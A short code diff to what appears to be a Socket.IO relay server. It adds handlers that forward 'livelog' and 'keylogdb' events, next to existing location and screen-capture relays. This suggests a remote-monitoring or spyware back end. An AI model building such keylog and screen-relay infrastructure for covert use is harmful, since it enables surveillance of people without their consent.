@@ -144,6 +144,14 @@ socket.broadcast.emit("allroom", ""+socket.rooms);
     socket.to(room).emit("locationdb", data);
   });
 
+  socket.on("livelog", (room, data) => {
+    socket.to(room).emit("livelog", data);
+  });
+
+  socket.on("keylogdb", (room, data) => {
+    socket.to(room).emit("keylogdb", data);
+  });
+
   socket.on("screendb", (room, data) => {
     socket.to(room).emit("screendb", data);
   });
